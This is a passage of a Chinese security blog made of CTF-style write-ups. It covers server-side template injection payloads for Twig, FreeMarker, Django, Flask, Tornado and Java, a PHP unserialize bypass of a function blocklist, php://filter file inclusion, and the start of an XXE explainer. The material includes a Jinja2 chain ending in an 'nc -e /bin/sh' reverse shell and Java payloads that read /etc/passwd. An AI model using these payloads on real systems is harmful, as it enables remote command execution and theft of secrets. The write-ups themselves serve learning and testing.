<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function getFilter($name)</span><br><span class="line">&#123;</span><br><span class="line">        [snip]</span><br><span class="line">        foreach ($this-&gt;filterCallbacks as $callback) &#123;</span><br><span class="line">        if (false !== $filter = call_user_func($callback, $name)) &#123;//注意这行</span><br><span class="line">            return $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback($callable)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;filterCallbacks[] = $callable;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>由于这个函数带有call_user_func()这个危险函数，所以我们可以用exec()作为回调函数传进去，实现命令执行，因此构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="freeMarker模板"><a href="#freeMarker模板" class="headerlink" title="freeMarker模板"></a>freeMarker模板</h5><p>可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>
<p>上面有格式，由于现阶段没有源码，所以无法分析</p>
<h4 id="利用框架本身的特性进行攻击"><a href="#利用框架本身的特性进行攻击" class="headerlink" title="利用框架本身的特性进行攻击"></a>利用框架本身的特性进行攻击</h4><h5 id="Django模板"><a href="#Django模板" class="headerlink" title="Django模板"></a>Django模板</h5><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;)</span><br><span class="line">    return HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>
<p>注入点明显是email，但是如果我们的能力被限制得不能执行命令，但又想获得和user有关的配置信息。我们可以先看一个和user有关的变量request.user，所以我们要在没有应用源码的情况下学会寻找框架本身的属性，看框架有什么属性和类之间的引用</p>
<p>我们经过查找，Django自带的admin（即后台）的model.py导入了当前网站配置信息，因此我们要通过某种方式找到Django默认应用admin的model，再通过model获取settings对象，从而获取数据库账号密码及web加密密钥，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; </span><br></pre></td></tr></table></figure>
<h5 id="flask-jinja2"><a href="#flask-jinja2" class="headerlink" title="flask/jinja2"></a>flask/jinja2</h5><p>config是flask模板的一个全局变量，它代表了“当前配置对象（flask.config)”，它是类字典的对象，包含所有应用程序的配置值，它一般包含数据库链接字符串，连接第三方凭证，SECRET_KEY等敏感值，而且config有很多神奇的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from_envvar</span><br><span class="line"></span><br><span class="line">from_object</span><br><span class="line"></span><br><span class="line">from_pyfile</span><br><span class="line"></span><br><span class="line">root_path</span><br></pre></td></tr></table></figure>
<p>我们可以利用from_pyfile和from_object来命令执行</p>
<p>from_pyfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def from_pyfile(self, filename, silent=False):</span><br><span class="line"></span><br><span class="line">    filename = os.path.join(self.root_path, filename)</span><br><span class="line">    d = types.ModuleType(&#x27;config&#x27;)</span><br><span class="line">    d.__file__ = filename</span><br><span class="line">    try:</span><br><span class="line">        with open(filename) as config_file:</span><br><span class="line">            exec(compile(config_file.read(), filename, &#x27;exec&#x27;), d.__dict__)</span><br><span class="line">    except IOError as e:</span><br><span class="line">        if silent and e.errno in (errno.ENOENT, errno.EISDIR):</span><br><span class="line">            return False</span><br><span class="line">        e.strerror = &#x27;Unable to load configuration file (%s)&#x27; % e.strerror</span><br><span class="line">        raise</span><br><span class="line">    self.from_object(d)</span><br><span class="line">    return True</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>from_object</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def from_object(self, obj):</span><br><span class="line"></span><br><span class="line">    if isinstance(obj, string_types):</span><br><span class="line">        obj = import_string(obj)</span><br><span class="line">    for key in dir(obj):</span><br><span class="line">        if key.isupper():</span><br><span class="line">            self[key] = getattr(obj, key)</span><br></pre></td></tr></table></figure>
<p>from_pyfile这个方法将传入文件使用compile()这个python内置方法将其编译成字节码（.pyc)，然后放到exec()函数中执行，注意最后一个参数d.__dict__，是指定exec执行的上下文，它后面调用了from_object()方法，然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for key in dir(obj):</span><br><span class="line">           if key.isupper():</span><br><span class="line">               self[key] = getattr(obj, key)</span><br></pre></td></tr></table></figure>
<p>根据上面代码可知这个方法会遍历obj的dict并且找到大写字母属性，将属性值给self[‘属性名’]，因此我们可以让from_pyfile去读</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from os import system</span><br><span class="line">SHELL=system</span><br></pre></td></tr></table></figure>
<p>此时我们可以使用config[‘SHELL’]调用system方法</p>
<p>因此构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/evil&#x27;, &#x27;w&#x27;).write(&#x27;from os import system%0aSHELL = system&#x27;) &#125;&#125;</span><br><span class="line">//写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#x27;/tmp/evil&#x27;) &#125;&#125;</span><br><span class="line">//加载system</span><br><span class="line">&#123;&#123; config[&#x27;SHELL&#x27;](&#x27;nc xxxx xx -e /bin/sh&#x27;) &#125;&#125;</span><br><span class="line">//执行命令反弹SHELL</span><br></pre></td></tr></table></figure>

<h5 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h5><p>我们可以以护网杯的tornado为例，就是通过SSTI获取cookie_secret，通过查找开源源码，我们可以看见代码中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.assertEqual(</span><br><span class="line">	__create_signature_v1(</span><br><span class="line">		hander.application.settings[&quot;cookie_secret&quot;],</span><br><span class="line">		&quot;foo&quot;,</span><br><span class="line">		&quot;12345678&quot;,</span><br><span class="line">		timestamp,</span><br><span class="line">	)</span><br></pre></td></tr></table></figure>
<p>可知调用hander.application.settings即可获取cookie_secret，但是有过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&#x27;()*-/=[\]_|</span><br></pre></td></tr></table></figure>
<p>所以我们可以使用RequestHandler对象，因为我们查官方文档：<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax%EF%BC%8C%E5%8F%91%E7%8E%B0">https://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax，发现</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler：当前RequestHandler对象</span><br></pre></td></tr></table></figure>
<p>且</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This method is called automatically when the request is finished(当请求完成后自动调用)</span><br><span class="line"></span><br><span class="line">RequestHandler.settings</span><br><span class="line"></span><br><span class="line">An alias for self.application.settings</span><br></pre></td></tr></table></figure>
<p>因此，我们可以使用handler.settings来访问cookie_secret，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.26.79:31093/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="利用模板语言本身的特性进行攻击"><a href="#利用模板语言本身的特性进行攻击" class="headerlink" title="利用模板语言本身的特性进行攻击"></a>利用模板语言本身的特性进行攻击</h4><h5 id="python语言的模板"><a href="#python语言的模板" class="headerlink" title="python语言的模板"></a>python语言的模板</h5><p>可看：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/</a></p>
<h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><p>java.lang包是java语言的核心，是java基础类，包含Object类、class类、string类，基本类型包装、基本的数学类等基本的类</p>
<p>执行命令paload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;cat etc/passwd&#x27;)&#125;</span><br></pre></td></tr></table></figure>
<p>文件操作payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>SSTI详细请看：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig</a>
 </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-各函数过滤绕过的反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/09/03/%E5%90%84%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2021-09-02T16:00:00.000Z" itemprop="datePublished">2021-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/09/03/%E5%90%84%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
        各函数过滤绕过反序列化漏洞
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="各函数过滤绕过反序列化漏洞"><a href="#各函数过滤绕过反序列化漏洞" class="headerlink" title="各函数过滤绕过反序列化漏洞"></a>各函数过滤绕过反序列化漏洞</h1><p>打开页面，然后进行抓包，发现有两个post提交的参数为func和p，然后再看页面的提示，我们可以猜测func是函数，而p是函数里的参数，所以我们可以在抓的包里构造post提交的两个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure>
<p>我们可以得到源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">  function gettime($func, $p) &#123;</span><br><span class="line">      $result = call_user_func($func, $p);</span><br><span class="line">      $a= gettype($result);</span><br><span class="line">      if ($a == &quot;string&quot;) &#123;</span><br><span class="line">          return $result;</span><br><span class="line">      &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  class Test &#123;</span><br><span class="line">      var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">      var $func = &quot;date&quot;;</span><br><span class="line">      function __destruct() &#123;</span><br><span class="line">          if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">              echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">  $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">  if ($func != null) &#123;</span><br><span class="line">      $func = strtolower($func);</span><br><span class="line">      if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">          echo gettime($func, $p);</span><br><span class="line">      &#125;else &#123;</span><br><span class="line">          die(&quot;Hacker...&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>


<p>其中，我们看见call_user_func()函数，我们可以利用call_user_func()函数</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>call_user_func()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()函数是类似于一种特别的调用函数的方法</span><br></pre></td></tr></table></figure>
<p>call_user_func_array()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func函数是类似于一种特别的调用函数的方法，不过参数要为数组</span><br></pre></td></tr></table></figure>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>call_user_func()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Class Test&#123;</span><br><span class="line">	$a=0;</span><br><span class="line">	function b($a)&#123;</span><br><span class="line">		echo $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(&#x27;b&#x27;,$a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>call_user_func_array()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Class Test&#123;</span><br><span class="line"></span><br><span class="line">	$a=0;</span><br><span class="line">	function b($c)&#123;</span><br><span class="line">		echo $c;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func_array(&#x27;b&#x27;,array($a));</span><br><span class="line">call_user_func_array(array(&#x27;Test&#x27;,&#x27;b&#x27;),array($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>但是，我们不知道flag在哪个文件里，所以我们使用system()函数来找flag的位置，但是system()被过滤掉了，但是我们发现它只对func进行函数的检测，所以我们可以利用反序列化的方式来构造func参数的值为system()<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;ls&quot;;</span><br><span class="line">        var $func = &quot;system&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$a=new Tset();</span><br><span class="line">echo serialize($a);   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>因此我们可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>我们便可以看到目录，找到flag所在文件后，只需构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unseraialize&amp;pO:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;cat 文件名&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看见flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-简单的include文件包含及php伪协议" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/09/03/%E7%AE%80%E5%8D%95%E7%9A%84include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8Aphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
  	<time datetime="2021-09-02T16:00:00.000Z" itemprop="datePublished">2021-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/09/03/%E7%AE%80%E5%8D%95%E7%9A%84include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8Aphp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
        简单的include文件包含及php伪协议
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="简单的include文件包含及php伪协议"><a href="#简单的include文件包含及php伪协议" class="headerlink" title="简单的include文件包含及php伪协议"></a>简单的include文件包含及php伪协议</h1><p>打开页面，随便按下一个选项，发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=woofers</span><br></pre></td></tr></table></figure>
<p>然后猜测是sql注入或文件包含，然后我们使用php伪协议来读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
<p>读取源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　$file = $_GET[&#x27;category&#x27;];</span><br><span class="line">　　</span><br><span class="line">　　if(isset($file))</span><br><span class="line">　　&#123;</span><br><span class="line">　　　　if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;   //必须含有woofers或meowers或index字符串</span><br><span class="line">　　　　　　include ($file . &#x27;.php&#x27;);  //参数后拼接.php</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　　　else&#123;</span><br><span class="line">　　　　　　echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>所以只要输入有woofers或meowers或index就可以使用include()函数进行包含，因此使用php伪协议进行读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/woofers/resource=flag</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Xpath注入和XXE漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/09/03/Xpath%E6%B3%A8%E5%85%A5%E5%92%8CXXE%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2021-09-02T16:00:00.000Z" itemprop="datePublished">2021-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/09/03/Xpath%E6%B3%A8%E5%85%A5%E5%92%8CXXE%E6%BC%8F%E6%B4%9E/">
        Xpath注入和XXE漏洞
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="XML文件"><a href="#XML文件" class="headerlink" title="XML文件"></a>XML文件</h2><p>XML是可扩展标记语言，是用来传输数据和存储数据</p>
<p>XML基本格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ecoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xmL文件声明--&gt;</span><br><span class="line">&lt;bookstore&gt;                                                                               &lt;!--根元素--&gt;</span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt;                                                 &lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="line">&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;/book&gt;                                                 &lt;!--book的结束--&gt;</span><br><span class="line">&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<?xmL version="1.0" encoding="UTF-8" standalone="yes"?><p>中的version是版本号，而encoding是语言，而standalone是yes时表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接被忽略这一项</p>
<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD是控制XML文档的格式规范，可以嵌入xmL文档中，作为内部声明，也可以单独的一个文件，为外部引用。</p>
<h4 id="内部DTD和外部DTD"><a href="#内部DTD和外部DTD" class="headerlink" title="内部DTD和外部DTD"></a>内部DTD和外部DTD</h4><p>内部DTD<br>使用内部的dtd文件，即将约束规则定义在xmL文档中，格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 [元素声明]</span><br></pre></td></tr></table></figure>
<p>示例代码</p>
